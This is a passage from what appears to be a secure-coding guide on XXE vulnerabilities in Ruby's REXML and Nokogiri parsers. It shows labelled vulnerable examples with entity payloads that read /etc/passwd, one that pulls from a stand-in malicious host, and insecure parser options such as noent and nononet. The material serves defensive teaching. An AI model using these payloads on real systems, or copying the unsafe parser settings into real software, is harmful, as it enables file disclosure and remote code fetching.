<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# Parsing XML without proper safeguards
doc = REXML::Document.new(xml)
puts doc.root.text
# This could output /etc/passwd
```

### Noent unsafe setting initialized, potential file system leak

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# noent substitutes entities, unsafe when parsing XML
po = Nokogiri::XML::ParseOptions.new.huge.noent
doc = Nokogiri::XML::Document.parse(xml, nil, nil, po)
puts doc.root.text  # This will output the contents of /etc/passwd

##
# User Database
#
# Note that this file is consulted directly only when the system is running
...
```

### Nononet unsafe setting initialized, potential malware execution

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://untrustedhost.example.com/maliciousCode" >]>
<foo>&xxe;</foo>
EOX

# In this example we use `ParseOptions` but select insecure options.
# NONONET allows network connections while parsing which is unsafe, as is DTDLOAD!
options = Nokogiri::XML::ParseOptions.new(Nokogiri::XML::ParseOptions::NONONET, Nokogiri::XML::ParseOptions::DTDLOAD)

# Parsing the xml above would allow `untrustedhost` to run arbitrary code on our server.
# See the "Impact" section for more.
doc = Nokogiri::XML::Document.parse(xml, nil, nil, options)
```

### Noent unsafe setting set, potential file system leak

```ruby
require 'nokogiri'

# Vulnerable code
xml = <<-EOX
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOX

# setting options may also look like this, NONET disallows network connections while parsing safe
options = Nokogiri::XML::ParseOptions::NOENT | Nokogiri::XML::ParseOptions::NONET

doc = Nokogiri::XML(xml, nil, nil, options) do |config|
  config.nononet  # Allows network access
  config.noent  # Enables entity expansion
  config.dtdload # Enables DTD loading
end

puts doc.to_xml
# This could output the contents of /etc/passwd
```

### Impact

XXE attacks can lead to multiple critical and high severity issues, like arbitrary file read, remote code execution, or information disclosure.

### When to consider

When working with XML parsing, particularly with user-controlled inputs.

## Path Traversal guidelines

### Description
